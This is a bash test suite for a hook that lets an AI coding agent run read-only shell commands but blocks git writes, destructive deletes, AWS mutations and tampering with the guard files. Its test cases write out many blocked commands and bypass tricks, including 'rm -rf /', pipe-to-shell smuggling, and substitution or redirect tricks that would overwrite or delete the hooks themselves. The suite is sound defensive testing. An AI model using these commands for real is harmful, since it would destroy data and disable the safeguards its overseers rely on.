#!/bin/bash
# Test suite for validate-crew-bash.sh
# Usage: ./core/tests/test-crew-bash.sh

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
HOOK="$SCRIPT_DIR/../hooks/validate-crew-bash.sh"
PASS=0
FAIL=0

# jq is required — this suite builds the hook's stdin JSON with `jq -n`. Fail fast with a
# clear message instead of cascading per-case failures if jq is absent.
if ! command -v jq >/dev/null 2>&1; then
  echo "ERROR: jq is required to run this suite. Install jq (brew install jq / apt-get install jq) and re-run." >&2
  exit 2
fi

check() {
  local expected="$1" cmd="$2"
  local json
  json=$(jq -n --arg cmd "$cmd" '{"tool_input":{"command":$cmd}}')
  local result
  if echo "$json" | bash "$HOOK" >/dev/null 2>&1; then
    result="ALLOW"
  else
    result="BLOCK"
  fi
  if [ "$result" = "$expected" ]; then
    PASS=$((PASS + 1))
  else
    printf "  FAIL: expected %-5s got %-5s  %s\n" "$expected" "$result" "$cmd"
    FAIL=$((FAIL + 1))
  fi
}

echo "=== Git read ops (ALLOW) ==="
check ALLOW 'git status'
check ALLOW 'git diff HEAD~1'
check ALLOW 'git log --oneline -5'
check ALLOW 'git show HEAD'
check ALLOW 'git branch -a'
check ALLOW 'git fetch origin'
check ALLOW 'git stash list'
check ALLOW 'git rev-parse HEAD'

echo "=== Git read ops via -C <path> (ALLOW — multi-repo ships) ==="
check ALLOW 'git -C /path/to/repo status'
check ALLOW 'git -C ../other-repo log --oneline -5'
check ALLOW 'git -C /a/b diff HEAD~1'
check ALLOW 'git -C repo show HEAD'

echo "=== Git write ops via -C <path> (BLOCK — still hits default-deny) ==="
check BLOCK 'git -C /path/to/repo commit -m x'
check BLOCK 'git -C ../other push origin main'
check BLOCK 'git -C repo reset --hard'

echo "=== Git write ops (BLOCK) ==="
check BLOCK 'git commit -m "test"'
check BLOCK 'git push origin main'
check BLOCK 'git add .'
check BLOCK 'git add -A'
check BLOCK 'git reset --hard'
check BLOCK 'git revert HEAD'
check BLOCK 'git merge feature'
check BLOCK 'git rebase main'
check BLOCK 'git cherry-pick abc123'
check BLOCK 'git clean -fd'

echo "=== Dev tools (ALLOW) ==="
check ALLOW 'npm test'
check ALLOW 'npm run build'
check ALLOW 'npx jest'
check ALLOW 'make build'
check ALLOW 'rake spec'
check ALLOW 'bundle exec rspec'
check ALLOW 'yarn test'

echo "=== File ops (ALLOW) ==="
check ALLOW 'cat foo.txt'
check ALLOW 'ls -la'
check ALLOW 'head -20 file.txt'
check ALLOW 'find . -name "*.js"'
check ALLOW 'grep -r "pattern" src/'
check ALLOW 'mkdir -p test/dir'
check ALLOW 'rm foo.txt'
check ALLOW 'cp src/a.js src/b.js'
check ALLOW 'mv old.js new.js'

echo "=== Destructive rm (BLOCK) ==="
check BLOCK 'rm -rf /'
check BLOCK 'rm -rf src/'
check BLOCK 'rm -r foo'
check BLOCK 'rm -fr bar'
check BLOCK 'rm --recursive dir'

echo "=== queue.md (BLOCK) ==="
check BLOCK 'cat queue.md'
check BLOCK 'echo "test" > queue.md'

echo "=== gh ops (BLOCK — not on allow-list) ==="
check BLOCK 'gh pr list'
check BLOCK 'gh pr view 123'
check BLOCK 'gh issue list'
check BLOCK 'gh pr create --title "test"'
check BLOCK 'gh pr comment 123 --body "test"'
check BLOCK 'gh pr merge 123'
check BLOCK 'gh issue create --title "test"'
check BLOCK 'gh issue close 123'

echo "=== curl ==="
check ALLOW 'curl https://example.com'
check ALLOW 'curl -s https://api.example.com/data'
check BLOCK 'curl -X POST https://api.example.com/data'
check BLOCK 'curl -X DELETE https://api.example.com/resource'
check BLOCK 'curl --data "foo=bar" https://api.example.com'

echo "=== curl mutating attached/cluster/long forms (BLOCK) ==="
check BLOCK "curl -d'x=1' https://api.example.com"
check BLOCK 'curl -dx https://api.example.com'
check BLOCK 'curl -sd x https://api.example.com'
check BLOCK 'curl -sdx https://api.example.com'
check BLOCK 'curl --data=x https://api.example.com'
check BLOCK 'curl --data-binary @file https://api.example.com'
check BLOCK 'curl --data-raw "x" https://api.example.com'
check BLOCK 'curl --data-urlencode "q=x" https://api.example.com'
check BLOCK 'curl --json "{}" https://api.example.com'
check BLOCK 'curl -K mutation.cfg https://api.example.com'
check BLOCK 'curl -sK mutation.cfg https://api.example.com'
check BLOCK 'curl --config mutation.cfg https://api.example.com'
check ALLOW 'curl -k https://self-signed.example.com'
check BLOCK 'curl -F field=@file https://api.example.com'
check BLOCK 'curl --form field=x https://api.example.com'
check BLOCK 'curl -T file.txt https://api.example.com'
check BLOCK 'curl --upload-file file.txt https://api.example.com'
check BLOCK 'curl -XPOST https://api.example.com'
check BLOCK 'curl -sXPOST https://api.example.com'
check BLOCK 'curl -sX POST https://api.example.com'
check BLOCK 'curl --request PUT https://api.example.com'

echo "=== curl GET forms still ALLOW (no false positives) ==="
check ALLOW 'curl -I https://example.com'
check ALLOW 'curl -sL https://example.com'
check ALLOW 'curl -fsSL https://example.com'
check ALLOW 'curl -o out.json https://example.com'
check ALLOW 'curl -H "Accept: application/json" https://api.example.com'
check ALLOW 'curl -u user:pass https://api.example.com'
check ALLOW 'curl -X GET https://api.example.com'
check ALLOW 'curl -D headers.txt https://example.com'

echo "=== Pipes and chains (ALLOW) ==="
check ALLOW 'git log --oneline | head -5'
check ALLOW 'cat file.txt | grep pattern | wc -l'
check ALLOW 'ls -la && echo "done"'

echo "=== Pipes and chains (BLOCK) ==="
check BLOCK 'echo "test" && git push'
check BLOCK 'npm test && git commit -m "pass"'

echo "=== FALSE POSITIVES FIXED: trigger tokens as DATA (ALLOW) ==="
# Tokens inside quoted args of data-arg commands are prose/paths, not invocations.
check ALLOW 'grep -rn "git push" docs/'
check ALLOW 'grep -r "git commit -m" src/'
check ALLOW 'echo "git push is handled by the Mate"'
check ALLOW 'echo "rm -rf is blocked for crew"'
check ALLOW 'cat notes/git-push-runbook.md'
# Quoted alternation pipes no longer fragment the segment (reviewer instance #3 class)
check ALLOW 'grep -E "(activate|send_test)" ui/server.ts'
check ALLOW "rg 'activate|send_test|x-mcp-action' -n src/"
check ALLOW 'grep -E "a|b" file.txt | wc -l'
# Quoted separators stay one segment
check ALLOW 'echo "a && b; c"'
check ALLOW 'grep "foo; git push bar" README.md'

echo "=== TRUE POSITIVES PRESERVED: wrappers / env-prefix / substitution (BLOCK) ==="
check BLOCK "bash -c 'git push origin main'"
check BLOCK 'sh -c "git commit -m x"'
check BLOCK 'FOO=1 git push'
check BLOCK 'env FOO=1 git push origin feat'
check BLOCK 'echo ok; git push'
check BLOCK 'true && git -C /repo commit -m y'
check BLOCK 'xargs git push'
check BLOCK 'echo "$(git push)"'
check BLOCK 'echo `git commit -m x`'
check BLOCK 'git log | xargs rm -rf'
check BLOCK 'find . -name "*.txt" | xargs rm -r'

echo "=== TRUE POSITIVES PRESERVED: git writes behind options (BLOCK) ==="
check BLOCK 'git -C ../other-repo push origin feat'
check BLOCK 'git -c user.name=x commit -m y'
check BLOCK 'git --git-dir=/x/.git push origin feat'
check BLOCK 'git stash drop'
check BLOCK 'git stash pop'

echo "=== Recursive rm tightened (BLOCK — separated flags now caught) ==="
check BLOCK 'rm -v -r somedir'
check BLOCK 'rm -f -R somedir'
check BLOCK 'ls && rm -rf dir'
check ALLOW 'rm -f file.txt'
check ALLOW 'rm river.txt'

echo "=== queue.md still blocked ANYWHERE, even quoted ==="
check BLOCK 'echo "queue.md"'
check BLOCK 'grep foo queue.md'

echo "=== Edge cases: multiline / heredoc / unbalanced quotes / || chains ==="
# Multiline command — each line is a segment
check BLOCK 'git status
git push origin feat'
check ALLOW 'git status
git log --oneline'
# Heredoc-smuggled op still blocks (body lines are scanned; fail-closed)
check BLOCK 'bash <<EOF
git push origin main
EOF'
# Unbalanced quote → naive-split fallback → over-block (fail-closed)
check BLOCK 'echo "unclosed && git push'
# || chains split too
check BLOCK 'grep -q x file || git push'
check ALLOW 'grep -q x file || echo missing'
# Quoted separators + a REAL op after still block
check BLOCK 'echo "a;b" && git add .'

echo "=== W2 B1: pipe-into-interpreter stdin smuggles (BLOCK) ==="
# The payload rides as DATA in the producing segment; a bare interpreter
# segment triggers a raw deny scan of the WHOLE command.
check BLOCK "echo 'git push origin main' | sh"
check BLOCK "echo 'git commit -m x' | bash"
check BLOCK 'printf "rm -rf /tmp/x\n" | python3'
check BLOCK "echo 'git push origin main' | env bash"
check BLOCK "echo 'gh pr merge 5' | zsh"
# Interpreters stay usable when nothing hot rides the pipe
check ALLOW 'bash scripts/run_tests.sh'
check ALLOW 'echo hello | bash format.sh'
check ALLOW "bash -c 'ls -la'"
check ALLOW 'python3 test_scripts/check.py'

echo "=== W2 B2: backslash-newline continuations rejoin (BLOCK) ==="
check BLOCK 'git pu\
sh origin main'
check BLOCK 'rm -r\
f /tmp/x'
check BLOCK 'cat que\
ue.md'
# Escaped backslash before newline is a REAL boundary, not a continuation
check ALLOW 'echo foo\\
git status'

echo "=== W2 N2: \$'...' ANSI-C quoting forces the raw scan (BLOCK) ==="
check BLOCK "git push origin \$'main'"

echo "=== W2 N3: zero-segment commands fail CLOSED (BLOCK) ==="
check BLOCK ';'
check BLOCK ' ; ; '

# ============================================================
# SHIP-HARDENED CONTENT DENIES (re-applied onto v2's engine).
# These are the ship fork's stricter policy layered on the adopted matching
# engine — do-not-regress coverage for the graft.
# ============================================================

echo "=== Ship: git checkout/switch denied (trunk-based) ==="
check BLOCK 'git checkout -b test-branch'
check BLOCK 'git checkout .'
check BLOCK 'git checkout -- path/to/file'
check BLOCK 'git switch main'
check BLOCK 'git switch -c feature'
# anchored: the tokens as DATA must NOT false-block
check ALLOW 'grep -rn "git checkout" docs/'
check ALLOW 'echo "use git switch to change branches"'

echo "=== Ship: git branch/tag destructive denied; list/inspect allowed ==="
check BLOCK 'git branch -D feature'
check BLOCK 'git branch -m old new'
check BLOCK 'git branch --delete feature'
check ALLOW 'git branch'
check ALLOW 'git branch -a'
check BLOCK 'git tag v1.0.0'
check BLOCK 'git tag -a v1 -m release'
check BLOCK 'git tag --delete v1'
check ALLOW 'git tag -l'
check ALLOW "git tag --list v*"
check ALLOW 'git tag -n5'
check ALLOW 'git tag --points-at HEAD'

echo "=== Ship: git remote mutations denied; list allowed ==="
check BLOCK 'git remote set-url origin git@example.com:x.git'
check BLOCK 'git remote add upstream git@example.com:y.git'
check BLOCK 'git remote remove origin'
check ALLOW 'git remote'
check ALLOW 'git remote -v'

echo "=== Ship: AWS Cost Explorer / S3-mutating denied; reads allowed ==="
check BLOCK 'aws ce get-cost-and-usage --time-period Start=2026-01-01,End=2026-02-01'
check BLOCK 'aws s3 cp local.txt s3://bucket/key'
check BLOCK 'aws s3 sync . s3://bucket/'
check BLOCK 'aws s3 rb s3://bucket'
check BLOCK 'aws ec2 start-instances --instance-ids i-123'
check ALLOW 'aws s3 ls s3://bucket/'
check ALLOW 'aws ec2 describe-instances'
check ALLOW 'aws sts get-caller-identity'
check ALLOW 'aws logs start-query --query-string fields'

echo "=== Ship: SAM mutating denied; validate allowed ==="
check BLOCK 'sam deploy'
check BLOCK 'sam build'
check BLOCK 'sam sync --stack-name x'
check ALLOW 'sam validate'
check ALLOW 'sam validate -t template.yaml'

echo "=== Ship: find -exec/-delete denied; listing allowed ==="
check BLOCK 'find . -name *.py -delete'
check BLOCK 'find . -type f -exec rm {} \;'
check ALLOW 'find . -name *.py'
check ALLOW 'find . -type f'

echo "=== 058-readonly re-review HIGH-A: backslash/quote-escaped flags still block (deny-side normalized) ==="
# The shell runs \-D / '-D' / \-rf as real flags; the deny-side copy strips backslashes+quotes.
check BLOCK 'git branch \-D feature'
check BLOCK "git branch '-D' feature"
check BLOCK 'git tag \-d v1'
check BLOCK 'find . \-delete'
check BLOCK "find . '-delete'"
check BLOCK 'rm \-rf src'
check BLOCK "rm '-rf' src"
# curl mutating flags backslash-escaped (curl deny has its own local strip — re-review HIGH-2)
check BLOCK 'curl \-d x=1 https://api.example.com'
check BLOCK 'curl \-X POST https://api.example.com'
# escaped tokens as DATA still don't false-block (allow-list sees the original segment)
check ALLOW 'grep -rn "git branch" docs/'
check ALLOW 'git branch -a'

echo "=== Ship: embedded \$(...) smuggle — inner verb re-scanned (do-not-regress: 036) ==="
check BLOCK 'echo $(git push origin main)'
check BLOCK 'echo $(aws s3 sync . s3://x)'
check BLOCK 'printf "%s" $(sam deploy)'
check BLOCK 'echo $(aws ec2 start-instances --instance-ids i-1)'
check BLOCK 'echo $(echo $(aws s3 rb s3://x))'
# quoted data (no real substitution) must NOT false-block
check ALLOW 'echo "aws s3 sync is a mutating command"'

echo "=== Ship: read-only capture idiom allowed ==="
check ALLOW 'QID=$(aws logs start-query --query-string fields)'

echo "=== 058 M1: aws athena start-query-execution is a WRITE verb (BLOCK) ==="
check BLOCK 'aws athena start-query-execution --query-string "DROP TABLE prod.users"'
check BLOCK 'aws athena start-query-execution --query-string "SELECT 1"'

echo "=== 058 L2: git -C <path> tag -l is a read (ALLOW); create still blocked ==="
check ALLOW 'git -C /repo tag -l'
check ALLOW 'git -C ../other tag --list'
check BLOCK 'git -C /repo tag v1.0'

echo "=== 058 H4: \$() paren-depth >=2 no longer launders; unbalanced fails closed (BLOCK) ==="
check BLOCK 'echo $( ( (aws ec2 terminate-instances --instance-ids i-1) ) )'
check BLOCK 'echo $(aws ec2 terminate-instances --filters "( ( ) )")'
check BLOCK 'echo $(aws ec2 terminate-instances --f "(a(b)c)")'
check BLOCK 'echo $(aws ec2 terminate-instances "a(b"'
# balanced legit capture + benign parens in data still allowed (do-not-regress)
check ALLOW 'QID=$(aws logs start-query --query-string fields)'
check ALLOW 'echo "(paren) text only"'

echo "=== 058 H5: quoted / lowercase curl method verb no longer launders (BLOCK) ==="
check BLOCK "curl -X 'DELETE' https://api.example.com/resource/1"
check BLOCK 'curl -X "POST" https://api.example.com'
check BLOCK "curl --request 'PUT' https://api.example.com"
check BLOCK 'curl -sX "POST" https://api.example.com'
check BLOCK 'curl -X post https://api.example.com'
# GET / read curl still allowed (do-not-regress); -x proxy is not a method
check ALLOW 'curl https://api.example.com/status'
check ALLOW 'curl -s https://api.example.com'

echo "=== 058 H6: write-vector onto a security-substrate file (BLOCK) ==="
check BLOCK 'echo "exit 0" > core/hooks/validate-crew-bash.sh'
check BLOCK 'echo x >> ~/.claude/hooks/ship-substrate-guard.sh'
check BLOCK 'cp /dev/null core/hooks/validate-crew-bash.sh'
check BLOCK 'cat evil > validate-readonly-bash.sh'
check BLOCK 'tee validate-janitor-bash.sh < evil'
check BLOCK 'echo x > "core/hooks/validate-crew-bash.sh"'
check BLOCK 'printf pwn > agents/ship-crew.md'
check BLOCK 'dd of=core/hooks/ship-substrate-guard.sh if=/dev/null'
check BLOCK 'sed -i s/x/y/ core/hooks/validate-crew-bash.sh'
check BLOCK '2> validate-crew-bash.sh echo x'
# reading a substrate file is fine; writing a NON-substrate file is fine (do-not-regress)
check ALLOW 'cat core/hooks/validate-crew-bash.sh'
check ALLOW 'echo "notes" > /tmp/scratch.txt'
check ALLOW 'grep -n exit core/hooks/validate-crew-bash.sh'

echo "=== 058 re-review HIGH-1: bare \$()/\` at command position not unwrapped-and-allowed (BLOCK) ==="
check BLOCK '$(cat /tmp/payload.txt)'
check BLOCK '`cat /tmp/payload.txt`'
check BLOCK '$(echo aws ec2 terminate-instances)'
check BLOCK '$(jq -r .cmd payload.json)'
check BLOCK 'X=$(echo hi) $(cat evil.sh)'
# assignment-capture of a read verb still allowed; substitution as an ARG still allowed
check ALLOW 'QID=$(aws logs start-query --query-string fields)'
check ALLOW 'X=$(cat /tmp/p.txt)'
check ALLOW 'ls "$(pwd)"'
check ALLOW 'echo $(date)'

echo "=== 058 re-review HIGH-2: rm/ln/chmod/truncate on a substrate file (BLOCK); legit uses ALLOW ==="
check BLOCK 'rm core/hooks/validate-crew-bash.sh'
check BLOCK 'rm ~/.claude/hooks/ship-substrate-guard.sh'
check BLOCK 'ln -sf /tmp/evil.sh core/hooks/validate-crew-bash.sh'
check BLOCK 'chmod 000 ~/.claude/agents/ship-crew.md'
check BLOCK 'truncate -s0 core/hooks/validate-janitor-bash.sh'
check BLOCK '  rm core/hooks/validate-crew-bash.sh'
check BLOCK 'true && rm core/hooks/validate-crew-bash.sh'
check BLOCK 'echo x | tee core/hooks/validate-crew-bash.sh'
check ALLOW 'rm build/artifact.o'
check ALLOW 'chmod +x scripts/run.sh'
check ALLOW 'ln -s a b'
check ALLOW 'cp a.txt b.txt'
# LOW-2 anchoring: writer token as DATA / mid-path no longer false-blocks
check ALLOW 'grep -rn "tee" core/agents/ship-crew.md'
check ALLOW 'ls -la /tmp/dd/ship-crew.md'

echo "=== 058 re-review MED-1/MED-2: sed --in-place + >&file onto substrate (BLOCK) ==="
check BLOCK 'sed --in-place s/x/y/ core/hooks/validate-crew-bash.sh'
check BLOCK 'echo x >&core/hooks/validate-crew-bash.sh'
check BLOCK 'echo x >& core/hooks/validate-crew-bash.sh'

# ============================================================
# 058 (B) ALLOW-LIST INVERSION (Nav ruling 2026-07-30): substrate is READ-ONLY for
# crew — if a protected name/dir appears anywhere, every segment must be a reader.
# These close the r3 bypasses the whole-command writer-verb DENY-list kept leaking.
# ============================================================

echo "=== (B) r3 HIGH-1: writer laundered through a substitution SEGMENT (BLOCK) ==="
check BLOCK 'echo $(rm core/hooks/validate-crew-bash.sh)'
check BLOCK 'A=$(rm core/hooks/validate-crew-bash.sh)'
check BLOCK 'echo $(cp evil crew-allow-local.sh)'

echo "=== (B) r3 HIGH-2: writer laundered through xargs (BLOCK); reader via xargs (ALLOW) ==="
check BLOCK 'echo core/hooks/validate-crew-bash.sh | xargs rm'
check BLOCK 'ls core/hooks | xargs -I{} rm {}/validate-crew-bash.sh'
check ALLOW 'cat core/hooks/validate-crew-bash.sh | xargs -n1 grep foo'

echo "=== (B) quote-aware extractor: \$() runs in double quotes even around a literal '\''; must extract (BLOCK) ==="
# bash executes $() inside "…" even when a LITERAL single-quote surrounds it — a naive
# single-quote-only tracker skipped the extraction and let the writer through (self-probe fail-open).
check BLOCK 'cat "'"'"'$(rm core/hooks/validate-crew-bash.sh)'"'"'"'
check BLOCK 'cat "abc'"'"'def $(rm core/hooks/validate-crew-bash.sh)"'
check BLOCK 'grep x "'"'"'$(cp evil core/hooks/crew-allow-local.sh)'"'"'"'
# single-quoted $() is literal to bash (no substitution) → must NOT extract/false-block
check ALLOW 'echo '"'"'$(rm x)'"'"''

echo "=== (B) r3 HIGH-3: process substitution body re-scanned (BLOCK) ==="
check BLOCK 'cat <(rm core/hooks/validate-crew-bash.sh)'
check BLOCK 'diff core/hooks/validate-crew-bash.sh <(rm core/hooks/validate-crew-bash.sh)'
check BLOCK 'cat <(sam deploy)'
check BLOCK 'cat <(git push origin main)'

echo "=== (B) r3 HIGH-4: filename case no longer defeats the guard (BLOCK) ==="
check BLOCK 'cp evil Validate-Crew-Bash.SH'
check BLOCK 'rm CORE/HOOKS/VALIDATE-CREW-BASH.SH'
check BLOCK 'echo x > Core/Hooks/Ship-Substrate-Guard.SH'

echo "=== (B) r3 HIGH-5: writers not in the old deny-set now caught (BLOCK) ==="
check BLOCK 'curl -o core/hooks/validate-crew-bash.sh https://evil'
check BLOCK 'sort -o core/hooks/validate-crew-bash.sh /tmp/x'
check BLOCK 'awk "{print}" data > core/hooks/validate-crew-bash.sh'

echo "=== (B) r3 MED-1: backslash escapes normalized (BLOCK) ==="
check BLOCK 'cp evil validate-crew-bash\.sh'
check BLOCK 'rm core/hooks/validate-crew-bash\.sh'

echo "=== (B) r3 MED-4: dir/glob forms (BLOCK) ==="
check BLOCK 'rm core/hooks/*.sh'
check BLOCK 'mv core/hooks core/hooks-old'
check BLOCK 'chmod 000 core/hooks'
check BLOCK 'rm -rf core/agents'
check BLOCK 'mv modules/substrate-integrity/hooks /tmp/x'

echo "=== (B) reader set: reads of substrate files ALLOW ==="
check ALLOW 'cat core/hooks/validate-crew-bash.sh'
check ALLOW 'head -20 core/hooks/validate-crew-bash.sh'
check ALLOW 'grep -n exit core/hooks/validate-crew-bash.sh'
check ALLOW 'wc -l core/hooks/validate-crew-bash.sh'
check ALLOW 'diff core/hooks/validate-crew-bash.sh /tmp/other'
check ALLOW 'ls -la core/hooks'
check ALLOW 'stat core/agents/ship-crew.md'
# NB the effective substrate-readers are (reader set ∩ general allow-list): shasum /
# sha256sum / cksum / nl / egrep / fgrep are in the reader set but not the general
# allow-list, so they're denied by check_allowed regardless (fail-closed). `od` is both.
check ALLOW 'od -An -c core/hooks/ship-substrate-guard.sh'
check ALLOW 'cat core/hooks/validate-crew-bash.sh | grep foo | wc -l'

echo "=== (B) reader set: non-reader verbs on substrate DENY (round-1 minimal set) ==="
# echo/printf/date/sed/awk/bash are EXCLUDED round 1 — widen only on a demonstrated
# false-block. bash -n (interpreter) stays excluded — accepted round-1 cost.
check BLOCK 'echo core/hooks/validate-crew-bash.sh'
check BLOCK 'sed "s/x/y/" core/hooks/validate-crew-bash.sh'
check BLOCK 'awk "{print}" core/hooks/validate-crew-bash.sh'
check BLOCK 'bash -n core/hooks/validate-crew-bash.sh'
check BLOCK 'cat core/hooks/validate-crew-bash.sh && date'
# git READ subcommands ARE reader-equivalent (Fable r6 MED-2 — the guard tells crew to use
# `git show <ref>:<path>`); mutating git forms are still denied earlier.
check ALLOW 'git diff core/hooks/validate-crew-bash.sh'
check ALLOW 'git show HEAD:core/hooks/validate-crew-bash.sh'
check ALLOW 'git log --oneline core/hooks/validate-crew-bash.sh'
check BLOCK 'git checkout core/hooks/validate-crew-bash.sh'
check BLOCK 'git config -f core/hooks/validate-crew-bash.sh x y'

echo "=== (B) awk field-ref inside single quotes no longer false-blocks (ALLOW) ==="
check ALLOW 'awk "{print \$(NF)}" data.txt'
check ALLOW "awk '{print \$(NF-1)}' data.txt"
# Bare arithmetic $((expr)) now fails CLOSED (accepted false-block): the arithmetic-skip
# that used to allow it re-opened a $()-in-arithmetic writer hole (Fable r4 HIGH-2), so the
# safe choice is to extract the body — pure arithmetic becomes a default-denied segment.
check BLOCK 'echo $((1+2))'
check BLOCK 'echo $(( (3+4) * 5 ))'

echo "=== (B) Fable r4 HIGH-1: \$'...' ANSI-C quoting can't launder a trailing substitution (BLOCK) ==="
check BLOCK "cat \$'\\'' \$(rm core/hooks/crew-allow-local.sh)"
check BLOCK "cat \$'a\\'b' \$(rm core/hooks/crew-allow-local.sh)"
check BLOCK "echo \$'\\'' \$(aws ec2 start-instances --instance-ids i-1)"

echo "=== (B) Fable r4 HIGH-2: \$() inside arithmetic is scanned, not skipped (BLOCK) ==="
check BLOCK 'cat $(( $(rm core/hooks/crew-allow-local.sh) ))'
check BLOCK 'cat $(( `rm core/hooks/crew-allow-local.sh` ))'
check BLOCK 'cat $(( 1 + $(rm core/hooks/crew-allow-local.sh) ))'
check BLOCK 'cat $((rm core/hooks/crew-allow-local.sh) )'
check BLOCK 'echo $((aws ec2 start-instances --instance-ids i-1) )'

echo "=== (B) Fable r4 HIGH-3: xxd / less removed from reader set (they write an outfile) (BLOCK) ==="
check BLOCK 'xxd -r payload.hex core/hooks/crew-allow-local.sh'
check BLOCK 'xxd README.md core/hooks/crew-allow-local.sh'
check BLOCK 'less -o core/hooks/crew-allow-local.sh core/hooks/validate-crew-bash.sh'

echo "=== (B) Fable r4 HIGH-4: zsh =(...) process substitution body re-scanned (BLOCK) ==="
check BLOCK 'cat =(rm core/hooks/crew-allow-local.sh)'
check BLOCK 'cat =(sam deploy)'
check BLOCK 'diff =(cat a) =(rm core/hooks/crew-allow-local.sh)'
# a real name=(…) array assignment is NOT process substitution (not mis-parsed / mis-extracted);
# bare array assignments aren't on the allow-list either way, so they default-deny (fail-closed)
check BLOCK 'arr=(1 2 3)'

echo "=== (B) Fable r4 HIGH-5: glob forms + deployed .claude guard dirs arm (BLOCK) ==="
check BLOCK 'rm ~/.claude/hooks/*.sh'
check BLOCK 'rm ~/.claude/agents/*.md'
check BLOCK 'rm .claude/hooks/*.sh'
check BLOCK 'rm core/hoo*/*.sh'
check BLOCK 'rm core/*.sh'
check BLOCK 'rm */hooks/*.sh'
# reads of those trees still pass; a same-named non-substrate FILE (core.tar) is not armed
check ALLOW 'ls ~/.claude/hooks'
check ALLOW 'grep -r pattern core'
check ALLOW 'rm core.tar.gz'
check ALLOW 'rm coreutils-note.txt'

echo "=== (B) Fable r5 MED-1: bare core/modules ancestor no longer over-blocks adopters (ALLOW) ==="
# Downstream layouts (Terraform modules/, app core/) must stay usable or operators disable the hook.
check ALLOW 'mkdir -p modules/vpc'
check ALLOW 'cp main.tf modules/vpc/main.tf'
check ALLOW 'touch src/core/newfile.js'
check ALLOW 'python3 core/train.py'
check ALLOW 'echo x > core/data.json'
check ALLOW 'npm test -- core/foo.test.js'
# residual (accepted, surfaced to Nav): bare rename/chmod of a literal `core` tree is NOT armed —
# it can't disable the DEPLOYED guard (~/.claude/hooks) and collides with every adopter `core/`.
check ALLOW 'mv core core.bak'
check ALLOW 'chmod 000 core'

echo "=== (B) Fable r5 HIGH-1: lone & is a command separator (writer after & is caught) (BLOCK) ==="
check BLOCK 'cat /etc/hosts & rm core/hooks/validate-crew-bash.sh'
check BLOCK 'grep x y & git push origin main'
check BLOCK 'cat x & find . -delete'
check BLOCK 'cat x & rm -rf somedir'
check BLOCK 'cat x >&2 & rm core/hooks/validate-crew-bash.sh'
# real redirects using & must NOT be mis-split into a false block
check ALLOW 'grep pattern file 2>&1'
check ALLOW 'ls -la &> /tmp/out.txt'
check ALLOW 'cat file >&2'

echo "=== (B) Fable r5 HIGH-2: glob/\${VAR} redirect target onto substrate (BLOCK) ==="
check BLOCK 'cat /etc/hosts > core/hooks/validate-crew-b*.sh'
check BLOCK 'cat /etc/hosts > core/hooks/*.sh'
check BLOCK 'cat /etc/hosts >> core/hooks/validate-crew-bas?.sh'
check BLOCK 'cat /etc/hosts > core/hooks/[v]alidate-crew-bash.sh'
check BLOCK 'cat /etc/hosts > ~/.claude/hooks/validate-crew-b*.sh'
check BLOCK 'cat /etc/hosts > core/hooks/validate-crew-bas${X}.sh'
# a reader redirecting to a concrete NON-substrate target still passes (do-not-regress)
check ALLOW 'cat core/hooks/validate-crew-bash.sh > /tmp/backup.txt'

echo "=== (B) Fable r5 HIGH-3: redirect INSIDE a substitution re-checked per-segment (BLOCK) ==="
check BLOCK 'cat $(cat /etc/hosts > core/hooks/validate-crew-bash.sh)'
check BLOCK 'cat <(cat /etc/hosts > core/hooks/validate-crew-bash.sh)'
check BLOCK 'cat `cat /etc/hosts > core/hooks/validate-crew-bash.sh`'

echo "=== (B) Fable r5 HIGH-4: rg/ag removed from reader set (--pre/--pager exec) (BLOCK) ==="
check BLOCK 'rg --pre /bin/rm foo core/hooks/'
check BLOCK 'rg --pre /bin/rm foo core/hooks/validate-crew-bash.sh'
check BLOCK 'ag --pager /bin/rm x core/hooks/'
# rg/ag on NON-substrate paths still work (general allow-list, not the substrate reader set)
check ALLOW 'rg pattern src/'
check ALLOW 'rg --pre /bin/cat foo src/'

echo "=== (B) Fable r4 MED-1: redirect target obscured by a substitution prefix (BLOCK) ==="
check BLOCK 'cat /etc/hosts > $(ls -d core/hooks)/crew-allow-local.sh'
check BLOCK 'echo x > `ls -d core/hooks`/validate-crew-bash.sh'
# a reader redirecting to a NON-substrate target still passes (do-not-regress)
check ALLOW 'cat core/hooks/validate-crew-bash.sh > /tmp/backup.txt'

echo "=== (B) MED-3: xargs with options works on macOS/BSD (ALLOW — no sed-label error) ==="
check ALLOW 'find . -name "*.txt" | xargs -n1 cat'
check ALLOW 'ls | xargs -I{} grep foo {}'
check ALLOW 'echo a | xargs -0 -n1 echo'

echo "=== (B) MED-2: substitution nesting past the ceiling fails closed (BLOCK); depth 8 OK ==="
check BLOCK 'echo $($($($($($($($($($(id)))))))))'
check ALLOW 'echo $(cat /tmp/a)'

echo "=== (B) non-substrate commands unaffected by the reader check (ALLOW) ==="
check ALLOW 'rm build/artifact.o'
check ALLOW 'echo hello'
check ALLOW 'date'
check ALLOW 'cp a.txt b.txt'

echo "=== (B) Fable r6 HIGH-1: substitution splice in a redirect target (BLOCK) ==="
check BLOCK 'cat /dev/null > ~/.claude/hooks/$()validate-crew-bash.sh'
check BLOCK 'cat /dev/null > core/hooks/$(cat /dev/null)validate-crew-bash.sh'
check BLOCK 'cat /dev/null > ~/.claude/hooks/`cat /dev/null`validate-crew-bash.sh'
check BLOCK 'head -c0 /dev/null >> ~/.claude/hooks/$()validate-crew-bash.sh'
check BLOCK 'cat /tmp/p.sh > ~/.claude/hooks/$()crew-allow-local.sh'
check BLOCK 'cat =(cat /dev/null > core/hooks/$()validate-crew-bash.sh)'

echo "=== (B) Fable r6 HIGH-2: substitution splice inside a protected basename un-arms nothing (BLOCK) ==="
check BLOCK 'rm ~/Library/LaunchAgents/com.ship.janitor$()-tick.plist'
check BLOCK 'rm ~/Library/LaunchAgents/com.ship.janitor${X}-tick.plist'
check BLOCK 'rm modules/substrate-integrity/sub${X}strate_tripwire.py'
check BLOCK 'rm modules/substrate-integrity/sub`cat /dev/null`strate_tripwire.py'

echo "=== (B) Fable r6 HIGH-3: redirect into a protected TREE, not just a listed basename (BLOCK) ==="
check BLOCK 'cat /dev/null > ~/.claude/settings.json'
check BLOCK 'grep -v x /tmp/a > ~/.claude/settings.json'
check BLOCK 'cat /dev/null > ~/.claude/settings.local.json'
check BLOCK 'cat /dev/null > ~/.claude/hooks/claude-notify.sh'
check BLOCK 'cat /dev/null > core/hooks/some-new-hook.sh'
# reader → concrete NON-protected target still passes (do-not-regress)
check ALLOW 'cat core/hooks/validate-crew-bash.sh > /tmp/copy.txt'

echo "=== (B) Fable r6 MED-1: integrity-verification readers reachable on the allow-list (ALLOW) ==="
